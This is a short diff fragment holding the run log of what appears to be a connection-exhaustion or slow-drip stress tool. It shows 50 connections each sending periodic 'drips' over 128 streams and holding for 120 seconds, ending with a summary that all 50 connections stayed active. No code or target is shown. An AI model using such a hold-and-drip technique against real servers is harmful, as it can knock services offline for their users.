+  [conn 27] Hold phase ended after 120s, 4 drips
+  [conn 42] Drip #4 at 120s (128 streams)
+  [conn 42] Hold phase ended after 120s, 4 drips
+  [conn 33] Drip #4 at 120s (128 streams)
+  [conn 33] Hold phase ended after 120s, 4 drips
+  [conn 45] Drip #4 at 120s (128 streams)
+  [conn 45] Hold phase ended after 120s, 4 drips
+  [conn 36] Drip #4 at 120s (128 streams)
+  [conn 36] Hold phase ended after 120s, 4 drips
+  [conn 7] Drip #4 at 120s (128 streams)
+  [conn 7] Hold phase ended after 120s, 4 drips
+  [conn 12] Drip #4 at 120s (128 streams)
+  [conn 12] Hold phase ended after 120s, 4 drips
+  [conn 8] Drip #4 at 120s (128 streams)
+  [conn 8] Hold phase ended after 120s, 4 drips
+  [conn 29] Drip #4 at 120s (128 streams)
+  [conn 29] Hold phase ended after 120s, 4 drips
+  [conn 46] Drip #4 at 120s (128 streams)
+  [conn 46] Hold phase ended after 120s, 4 drips
+  [conn 31] Drip #4 at 120s (128 streams)
+  [conn 31] Hold phase ended after 120s, 4 drips
+  [conn 49] Drip #4 at 120s (128 streams)
+  [conn 49] Hold phase ended after 120s, 4 drips
+  [conn 39] Drip #4 at 120s (128 streams)
+  [conn 39] Hold phase ended after 120s, 4 drips
+  [conn 37] Drip #4 at 120s (128 streams)
+  [conn 37] Hold phase ended after 120s, 4 drips
+  [conn 15] Drip #4 at 120s (128 streams)
+  [conn 15] Hold phase ended after 120s, 4 drips
+  [conn 47] Drip #4 at 120s (128 streams)
+  [conn 47] Hold phase ended after 120s, 4 drips
+  [conn 22] Drip #4 at 120s (128 streams)
+  [conn 22] Hold phase ended after 120s, 4 drips
+  [conn 5] Drip #4 at 120s (128 streams)
+  [conn 5] Hold phase ended after 120s, 4 drips
+  [conn 44] Drip #4 at 120s (128 streams)
+  [conn 44] Hold phase ended after 120s, 4 drips
+  [conn 17] Drip #4 at 120s (128 streams)
+  [conn 17] Hold phase ended after 120s, 4 drips
+  [conn 18] Drip #4 at 120s (128 streams)
+  [conn 18] Hold phase ended after 120s, 4 drips
+  [conn 23] Drip #4 at 120s (128 streams)
+  [conn 23] Hold phase ended after 120s, 4 drips
+  [conn 26] Drip #4 at 120s (128 streams)
+  [conn 26] Hold phase ended after 120s, 4 drips
+  [conn 21] Drip #4 at 120s (128 streams)
+  [conn 21] Hold phase ended after 120s, 4 drips
+  [conn 41] Drip #4 at 120s (128 streams)
+  [conn 41] Hold phase ended after 120s, 4 drips
+  [conn 19] Drip #4 at 120s (128 streams)
+  [conn 19] Hold phase ended after 120s, 4 drips
+  [conn 28] Drip #4 at 120s (128 streams)
+  [conn 28] Hold phase ended after 120s, 4 drips
+  [conn 13] Drip #4 at 120s (128 streams)
+  [conn 13] Hold phase ended after 120s, 4 drips
+  [conn 9] Drip #4 at 120s (128 streams)
+  [conn 9] Hold phase ended after 120s, 4 drips
+  [conn 43] Drip #4 at 120s (128 streams)
+  [conn 43] Hold phase ended after 120s, 4 drips
+  [conn 48] Drip #4 at 120s (128 streams)
+  [conn 48] Hold phase ended after 120s, 4 drips
+  [conn 25] Drip #4 at 120s (128 streams)
+  [conn 25] Hold phase ended after 120s, 4 drips
+  [conn 40] Drip #4 at 120s (128 streams)
+  [conn 40] Hold phase ended after 120s, 4 drips
+  [conn 35] Drip #4 at 120s (128 streams)
+  [conn 35] Hold phase ended after 120s, 4 drips
+  [conn 20] Drip #4 at 120s (128 streams)
+  [conn 20] Hold phase ended after 120s, 4 drips
+  [conn 32] Drip #4 at 120s (128 streams)
+  [conn 32] Hold phase ended after 120s, 4 drips
+  [conn 34] Drip #4 at 120s (128 streams)
+  [conn 34] Hold phase ended after 120s, 4 drips
+
+[*] Done. Total time: 127s
+    Connections still active: 50/50
+    Total wire uploaded: 195.5 MB
